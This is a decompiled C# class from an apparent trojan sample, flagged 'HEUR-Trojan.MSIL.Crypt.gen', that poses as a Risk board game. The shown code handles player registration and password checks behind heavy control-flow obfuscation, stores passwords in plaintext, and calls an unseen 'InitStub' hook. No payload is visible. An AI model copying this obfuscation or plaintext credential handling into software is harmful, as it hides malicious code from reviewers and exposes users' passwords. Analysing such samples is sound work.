// Decompiled with JetBrains decompiler
// Type: RiskGame.Human
// Assembly: IEnumUnkn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA80F1E7-116A-4A8E-96EA-FFB7A6C2BB6E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-4e20a72f2791a602f8ee9999765a9365729ff929da4d5fa6be7bfb4c20e9989e.exe

using IEnumUnkn.Attributes;
using IEnumUnkn.Rules;
using IEnumUnkn.Structs;
using RiskGame.Resolver;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;

namespace RiskGame
{
  [Serializable]
  public class Human : Player
  {
    private static readonly string m_Facade;
    private string _Instance;
    public bool m_Item;
    public bool wrapper;
    private static List<char> m_Initializer;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Human(string def, string cfg, bool testc, bool moveres2)
    {
      int num1 = 0;
      if (true)
        goto label_3;
label_1:
      // ISSUE: explicit constructor call
      base.\u002Ector(def);
      goto label_5;
label_2:
      int num2;
      num1 = num2;
label_3:
      while (true)
      {
        switch (num1)
        {
          case 0:
            ListenerManager.InitStub();
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto label_9;
          case 1:
          case 4:
            goto label_1;
          case 2:
          case 3:
            goto label_5;
          case 5:
            goto label_11;
          default:
            goto label_4;
        }
      }
label_11:
      return;
label_4:
      num2 = 3;
      goto label_2;
label_9:
      return;
label_5:
      this.CheckRequest(cfg ?? throw new ArgumentNullException("password"));
      this.m_Item = testc;
      this.wrapper = moveres2;
      num2 = 5;
      goto label_2;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CheckRequest(string ident) => this._Instance = ident;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static Human FlushRequest(string def, string result)
    {
      int num1 = 2;
      StreamReader streamReader;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 2:
            if (!(def == ""))
            {
              num1 = 1;
              continue;
            }
            break;
          case 1:
            if (def != null && !(result == ""))
            {
              num1 = 4;
              continue;
            }
            break;
          case 3:
          case 5:
            goto label_1;
          case 4:
            num2 = result == null ? 1 : 0;
            goto label_5;
          case 6:
            goto label_12;
          default:
            num1 = 5;
            continue;
        }
        num2 = 1;
label_5:
        if (num2 == 0)
        {
          streamReader = new StreamReader(Human.m_Facade);
          num1 = 6;
        }
        else
          break;
      }
label_1:
      throw new ArgumentNullException();
label_12:
      try
      {
        bool result1;
        bool result2;
        bool flag1;
        do
        {
          string str1;
          bool flag2 = (str1 = streamReader.ReadLine()) != null;
          int num3 = 5;
          while (true)
          {
            int num4 = num3;
            string str2;
            string str3;
            string str4;
            string str5;
            while (true)
            {
              switch (num4)
              {
                case 0:
                case 1:
                  str3 = str1.Substring(10, 15);
                  str4 = str1.Substring(25, 5);
                  str5 = str1.Substring(30, 5);
                  num4 = 3;
                  continue;
                case 2:
                  str5 = str5.Trim();
                  result1 = false;
                  goto case 6;
                case 3:
                  goto label_14;
                case 4:
                case 7:
                  goto label_24;
                case 5:
                  goto label_22;
                case 6:
                  bool.TryParse(str4, out result1);
                  result2 = false;
                  bool.TryParse(str5, out result2);
                  if (!(str2 == def) || !(str3 == result))
                  {
                    flag1 = str2 == def;
                    if (true)
                    {
                      num4 = 7;
                      continue;
                    }
                    goto case 2;
                  }
                  else
                    goto label_16;
                case 8:
                  goto label_28;
                default:
                  goto label_21;
              }
            }
label_14:
            str2 = str2.Trim();
            str3 = str3.Trim();
            str4 = str4.Trim();
            num3 = 2;
            continue;
label_21:
            num3 = 6;
            continue;
label_22:
            if (flag2)
            {
              str2 = str1.Substring(0, 10);
              num3 = 1;
            }
            else
              num3 = 8;
          }
label_24:;
        }
        while (!flag1);
        goto label_25;
label_16:
        return new Human(def, result, result1, result2);
label_25:
        throw new Publisher();
label_28:
        throw new ListBridgeRule();
      }
      finally
      {
        streamReader?.Dispose();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Register(
      string username,
      string password,
      bool music_enabled,
      bool hints_enabled)
    {
      int num = 3;
      Human init;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            Human.CollectRequest(init);
            if (true)
            {
              num = 5;
              continue;
            }
            goto case 3;
          case 1:
          case 4:
            init = new Human(username, password, music_enabled, hints_enabled);
            goto case 0;
          case 3:
            Human.CompareRequest(username, password);
            num = 4;
            continue;
          case 5:
            goto label_7;
          default:
            num = 0;
            continue;
        }
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void CollectRequest(Human init)
    {
      using (StreamWriter streamWriter = new StreamWriter(Human.m_Facade, true))
      {
        string str = string.Format("{0}{1}{2}{3}", (object) init.WriteField().PadRight(10), (object) init._Instance.PadRight(15), (object) init.m_Item.ToString().PadRight(5), (object) init.wrapper.ToString().PadRight(5));
        int num = 2;
        if (Human.VisitObject())
          goto label_3;
label_2:
        streamWriter.WriteLine(str);
        return;
label_3:
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              goto label_2;
            case 1:
              goto label_8;
            case 3:
              goto label_9;
            default:
              num = 3;
              continue;
          }
        }
label_8:
        return;
label_9:;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void TestRequest(Human def)
    {
      int num1 = 3;
      List<string> stringList;
      StreamWriter streamWriter;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              stringList = new List<string>();
              if (Human.VisitObject())
              {
                num2 = 4;
                continue;
              }
              goto label_2;
            case 1:
            case 4:
              goto label_21;
            case 2:
              goto label_2;
            case 5:
              goto label_25;
            default:
              if (true)
              {
                num2 = 2;
                continue;
              }
              goto label_25;
          }
        }
label_2:
        StreamReader streamReader;
        try
        {
          string str1 = def.WriteField().PadRight(10);
          int num3 = 0;
          while (true)
          {
            int num4 = num3;
            string str2;
            while (true)
            {
              string str3;
              string str4;
              int num5;
              switch (num4)
              {
                case 0:
                  str2 = def._Instance.PadRight(15);
                  break;
                case 1:
                case 4:
                  if (!(str1 == str4))
                  {
                    num5 = 0;
                    goto label_9;
                  }
                  else
                    goto case 2;
                case 2:
                  num5 = str2 == str3 ? 1 : 0;
                  goto label_9;
                case 3:
                case 5:
label_4:
                  break;
                case 6:
                  goto label_20;
                default:
                  num4 = 2;
                  continue;
              }
              string str5;
              if ((str5 = streamReader.ReadLine()) == null)
              {
                num4 = 6;
                continue;
              }
              str4 = str5.Substring(0, 10);
              str3 = str5.Substring(10, 15);
              num4 = 4;
              continue;
label_9:
              if (num5 == 0)
              {
                stringList.Add(str5);
                goto label_4;
              }
              else
                break;
            }
            stringList.Add(string.Format("{0}{1}{2}{3}", (object) str1, (object) str2, (object) def.m_Item.ToString().PadRight(5), (object) def.wrapper.ToString().PadRight(5)));
            num3 = 5;
          }
        }
        finally
        {
          streamReader?.Dispose();
        }
label_20:
        streamWriter = new StreamWriter(Human.m_Facade, false);
        num1 = 5;
        continue;
label_21:
        streamReader = new StreamReader(Human.m_Facade);
        goto label_2;
      }
label_25:
      try
      {
        foreach (string str in stringList)
        {
          int num6 = 2;
          while (true)
          {
            switch (num6)
            {
              case 0:
              case 2:
                goto label_28;
              case 1:
              case 3:
                goto label_31;
              default:
                num6 = 3;
                continue;
            }
          }
label_28:
          streamWriter.WriteLine(str);
label_31:;
        }
      }
      finally
      {
        streamWriter?.Dispose();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void ComputeRequest(Human def, string visitor)
    {
      int num1 = 4;
      List<string> stringList;
      StreamReader streamReader;
      StreamWriter streamWriter;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            stringList = new List<string>();
            if (Human.VisitObject())
            {
              num1 = 3;
              continue;
            }
            goto case 2;
          case 1:
          case 3:
            streamReader = new StreamReader(Human.m_Facade);
            goto case 2;
          case 2:
            try
            {
              string str1 = def.WriteField().PadRight(10);
              int num2 = 5;
              if (true)
                goto label_16;
label_3:
              string str2 = def._Instance.PadRight(15);
              goto label_12;
label_5:
              string str3;
              int num3 = str2 == str3 ? 1 : 0;
label_7:
              string str4;
              int num4;
              if (num3 != 0)
              {
                num4 = 3;
                goto label_15;
              }
              else
                stringList.Add(str4);
label_11:
label_12:
              string str5;
              if ((str4 = streamReader.ReadLine()) != null)
              {
                str5 = str4.Substring(0, 10);
                str3 = str4.Substring(10, 15);
                if (true)
                {
                  num2 = 4;
                  goto label_16;
                }
                else
                  goto label_5;
              }
              else
                num4 = 6;
label_15:
              num2 = num4;
label_16:
              switch (num2)
              {
                case 0:
                case 5:
                  goto label_3;
                case 1:
                case 2:
                  goto label_5;
                case 3:
                  stringList.Add(string.Format("{0}{1}{2}{3}", (object) str1, (object) visitor.PadRight(15), (object) def.m_Item.ToString().PadRight(5), (object) def.m_Item.ToString().PadRight(5)));
                  goto label_11;
                case 4:
                  if (!(str1 == str5))
                  {
                    num3 = 0;
                    goto label_7;
                  }
                  else
                    goto label_5;
                case 6:
                  break;
                default:
                  num4 = 1;
                  goto label_15;
              }
            }
            finally
            {
              streamReader?.Dispose();
            }
            streamWriter = new StreamWriter(Human.m_Facade, false);
            if (true)
            {
              num1 = 5;
              continue;
            }
            goto case 1;
          case 5:
            goto label_25;
          default:
            num1 = 2;
            continue;
        }
      }
label_25:
      try
      {
        foreach (string str in stringList)
        {
          int num5 = 2;
          while (true)
          {
            switch (num5)
            {
              case 0:
              case 2:
                goto label_28;
              case 1:
              case 3:
                goto label_31;
              default:
                if (true)
                {
                  num5 = 3;
                  continue;
                }
                goto label_31;
            }
          }
label_28:
          streamWriter.WriteLine(str);
label_31:;
        }
      }
      finally
      {
        streamWriter?.Dispose();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void CompareRequest(string v, string cust)
    {
      int num1 = 3;
      char[] charArray1;
      char[] charArray2;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 0:
            case 3:
              if (v == "")
                break;
              goto label_7;
            case 1:
              if (v != null && !(cust == ""))
              {
                num3 = cust == null ? 1 : 0;
                goto label_4;
              }
              else
                break;
            case 2:
            case 4:
              goto label_16;
            case 5:
label_8:
              if (Human.RateRequest(charArray1) && Human.AddRequest(v) && Human.LogoutRequest(charArray2))
              {
                num2 = 2;
                continue;
              }
              goto label_18;
            case 6:
              goto label_10;
            case 7:
              goto label_21;
            default:
              goto label_15;
          }
          num3 = 1;
label_4:
          if (num3 == 0)
          {
            charArray1 = v.ToCharArray();
            charArray2 = cust.ToCharArray();
            if (!Human.RemoveRequest(charArray1))
              goto label_18;
            else
              goto label_8;
          }
          else
            break;
        }
        num1 = 6;
        continue;
label_7:
        num1 = 1;
        continue;
label_15:
        num1 = 5;
        continue;
label_16:
        int num4;
        if (Human.VerifyRequest(charArray2))
        {
          num4 = !Human.PushRequest(charArray2) ? 1 : 0;
          goto label_19;
        }
label_18:
        num4 = 1;
label_19:
        if (num4 != 0)
          num1 = 7;
        else
          goto label_12;
      }
label_10:
      throw new ArgumentNullException();
label_12:
      return;
label_21:
      throw new Template(Human.RemoveRequest(charArray1), Human.RateRequest(charArray1), Human.AddRequest(v), Human.LogoutRequest(charArray2), Human.VerifyRequest(charArray2), Human.PushRequest(charArray2));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void PostRequest(string res)
    {
      int num1 = 4;
      if (true)
        goto label_5;
label_1:
      int num2;
      int num3;
      if (!(res == ""))
      {
        num2 = 2;
      }
      else
      {
        num3 = 1;
        goto label_15;
      }
label_4:
      num1 = num2;
label_5:
      char[] charArray;
      while (true)
      {
        int num4;
        switch (num1)
        {
          case 0:
          case 4:
            goto label_1;
          case 1:
            if (!Human.LogoutRequest(charArray))
              break;
            goto case 3;
          case 2:
            goto label_13;
          case 3:
          case 5:
            if (Human.VerifyRequest(charArray))
            {
              num4 = !Human.PushRequest(charArray) ? 1 : 0;
              goto label_10;
            }
            else
              break;
          case 6:
            goto label_18;
          default:
            goto label_6;
        }
        num4 = 1;
label_10:
        if (num4 != 0)
        {
          int num5 = 6;
          num1 = Human.PushObject() ? num5 : num5;
        }
        else
          goto label_12;
      }
label_6:
      num2 = 5;
      goto label_4;
label_12:
      return;
label_13:
      num3 = res == null ? 1 : 0;
label_15:
      if (num3 != 0)
        throw new ArgumentNullException();
      charArray = res.ToCharArray();
      if (Human.VisitObject())
      {
        num1 = 1;
        goto label_5;
      }
label_18:
      throw new Template(true, true, true, Human.LogoutRequest(charArray), Human.VerifyRequest(charArray), Human.PushRequest(charArray));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool RemoveRequest(char[] i)
    {
      int num1 = 3;
      if (Human.VisitObject())
        goto label_8;
label_1:
      int num2;
      if (i.Length <= 10)
      {
        if (true)
        {
          num1 = 4;
          goto label_8;
        }
      }
      else
      {
        num2 = 1;
        goto label_7;
      }
label_3:
      bool flag = false;
      goto label_11;
label_5:
      num2 = i.Length < 3 ? 1 : 0;
label_7:
      if (num2 == 0)
      {
        flag = true;
        if (true)
          num1 = 5;
        else
          goto label_5;
      }
      else
        goto label_3;
label_8:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_1;
          case 1:
          case 4:
            goto label_5;
          case 2:
            goto label_3;
          case 5:
            goto label_11;
          default:
            num1 = 2;
            continue;
        }
      }
label_11:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool RateRequest(char[] item)
    {
      int num1 = 6;
      bool flag;
      if (Human.VisitObject())
      {
        while (true)
        {
          int index;
          char[] chArray;
          char c;
          List<char> charList;
          int num2;
          switch (num1)
          {
            case 0:
            case 6:
              charList = new List<char>()
              {
                '_',
                '-',
                '.',
                ',',
                '/'
              };
              num1 = 5;
              continue;
            case 1:
            case 5:
              chArray = item;
              index = 0;
              break;
            case 2:
              flag = true;
              if (true)
              {
                num1 = 7;
                continue;
              }
              goto case 4;
            case 3:
            case 7:
              goto label_16;
            case 4:
              num2 = !charList.Contains(c) ? 1 : 0;
              goto label_11;
            default:
              num1 = 3;
              continue;
          }
label_2:
          int num3;
          if (index >= chArray.Length)
          {
            num3 = 2;
          }
          else
          {
            c = chArray[index];
            if (!char.IsLetterOrDigit(c))
            {
              num3 = 4;
            }
            else
            {
              num2 = 0;
              goto label_11;
            }
          }
          num1 = num3;
          continue;
label_11:
          if (num2 == 0)
          {
            ++index;
            goto label_2;
          }
          else
            break;
        }
        flag = false;
      }
label_16:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool AddRequest(string i)
    {
      int num1 = 3;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        bool flag2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              flag2 = File.Exists(Human.m_Facade);
              num2 = 4;
              continue;
            case 1:
            case 4:
              goto label_2;
            case 2:
              goto label_6;
            case 5:
              goto label_23;
            default:
              goto label_5;
          }
        }
label_2:
        if (!flag2)
        {
          flag1 = true;
          num1 = 5;
          continue;
        }
        break;
label_5:
        num1 = 2;
      }
label_6:
      using (StreamReader streamReader = new StreamReader(Human.m_Facade))
      {
label_14:
        string str1;
        bool flag3 = (str1 = streamReader.ReadLine()) != null;
label_9:
        string str2;
        int num3;
        while (flag3)
        {
          str2 = str1.Substring(0, 10);
          num3 = 3;
          if (true)
            goto label_16;
        }
        int num4 = 5;
label_15:
        num3 = num4;
label_16:
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 3:
              goto label_11;
            case 1:
            case 4:
              goto label_13;
            case 2:
              goto label_9;
            case 5:
              goto label_18;
            default:
              if (!Human.PushObject())
              {
                num3 = 2;
                continue;
              }
              goto label_18;
          }
        }
label_11:
        str2 = str2.Trim();
        if (str2 == i)
        {
          num4 = 4;
          goto label_15;
        }
        else
          goto label_14;
label_13:
        flag1 = false;
        goto label_23;
label_18:
        flag1 = true;
      }
label_23:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool LogoutRequest(char[] ident)
    {
      int num1 = 3;
      bool flag;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 3:
            if (ident.Length <= 15)
            {
              num2 = 2;
              goto label_8;
            }
            else
            {
              num3 = 1;
              break;
            }
          case 1:
          case 2:
            num3 = ident.Length < 8 ? 1 : 0;
            break;
          case 4:
          case 5:
            goto label_11;
          default:
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto label_11;
        }
        if (num3 == 0)
        {
          flag = true;
          num2 = 5;
        }
        else
          break;
label_8:
        num1 = num2;
      }
      flag = false;
label_11:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool VerifyRequest(char[] v)
    {
      int num1 = 0;
      bool flag;
      while (true)
      {
        int index;
        char[] chArray;
        char c;
        int num2;
        switch (num1)
        {
          case 0:
            chArray = v;
            int num3 = 5;
            num1 = Human.PushObject() ? num3 : num3;
            continue;
          case 1:
          case 3:
            flag = false;
            num2 = 6;
            goto label_9;
          case 2:
            if (char.IsLetterOrDigit(c) || Human.m_Initializer.Contains(c))
            {
              ++index;
              break;
            }
            goto case 1;
          case 4:
          case 6:
          case 7:
            goto label_12;
          case 5:
            index = 0;
            break;
          default:
            num2 = 1;
            goto label_9;
        }
        if (index < chArray.Length)
        {
          c = chArray[index];
          num2 = 2;
        }
        else
        {
          flag = true;
          num2 = 7;
        }
label_9:
        num1 = num2;
      }
label_12:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool PushRequest(char[] def)
    {
      int num1 = 6;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        bool flag2;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_9;
            case 1:
            case 8:
              goto label_3;
            case 2:
            case 10:
              goto label_22;
            case 3:
            case 7:
              goto label_14;
            case 4:
              goto label_11;
            case 5:
              flag2 = true;
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto label_9;
            case 6:
              goto label_19;
            case 9:
              goto label_1;
            default:
              goto label_18;
          }
        }
label_1:
        bool flag3;
        bool flag4;
        bool flag5;
        if (flag3 & flag4 & flag5 & flag2)
        {
          num1 = 0;
          continue;
        }
        flag1 = false;
        num1 = 10;
        continue;
label_3:
        flag4 = false;
        flag5 = false;
        flag2 = false;
        char[] chArray = def;
        int index = 0;
        goto label_15;
label_9:
        flag1 = true;
        num1 = 2;
        continue;
label_11:
        flag4 = true;
label_14:
        ++index;
label_15:
        if (index < chArray.Length)
        {
          char c = chArray[index];
          if (char.IsUpper(c))
          {
            flag3 = true;
            goto label_14;
          }
          else
          {
            if (char.IsLower(c))
            {
              num1 = 5;
              continue;
            }
            if (!Human.m_Initializer.Contains(c))
            {
              if (char.IsDigit(c))
              {
                flag5 = true;
                goto label_14;
              }
              else
                goto label_14;
            }
            else
            {
              num1 = 4;
              continue;
            }
          }
        }
        else
          goto label_1;
label_18:
        num1 = 9;
        continue;
label_19:
        flag3 = false;
        num1 = 8;
      }
label_22:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Human()
    {
      int num = 4;
      if (Human.VisitObject())
        goto label_4;
label_1:
      Human.m_Initializer = new List<char>()
      {
        '!',
        '£',
        '$',
        '€',
        '%',
        '^',
        '&',
        '*',
        '+',
        '-',
        '=',
        '_',
        '<',
        '>',
        '@',
        '?',
        '~',
        '#'
      };
      if (true)
      {
        num = 5;
        goto label_4;
      }
label_2:
      ListenerManager.InitStub();
      num = 3;
label_4:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            goto label_2;
          case 1:
          case 3:
            goto label_3;
          case 2:
            goto label_1;
          case 5:
            goto label_7;
          default:
            if (Human.VisitObject())
            {
              num = 2;
              continue;
            }
            goto label_6;
        }
      }
label_3:
      Human.m_Facade = "Usersaves.txt";
      goto label_1;
label_7:
      return;
label_6:;
    }

    internal static bool VisitObject() => true;

    internal static bool PushObject() => false;
  }
}
